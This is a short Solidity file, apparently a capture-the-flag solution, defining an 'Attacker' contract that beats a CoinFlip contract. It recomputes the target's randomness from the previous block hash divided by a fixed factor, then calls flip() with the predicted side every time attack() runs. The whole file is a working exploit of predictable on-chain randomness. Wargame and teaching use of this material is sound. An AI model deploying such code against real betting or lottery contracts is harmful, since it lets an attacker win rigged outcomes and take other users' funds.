// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip{
    function flip(bool _guess) external returns (bool) ;
    function consecutiveWins()view external returns (uint);
}
contract Attacker {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip target;

  constructor(address targetAddress) {
    target=CoinFlip(targetAddress);

  }

  function attack() public returns (uint) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
    target.flip(side);
    uint consecutiveWins=target.consecutiveWins();
    return consecutiveWins;

  }


}

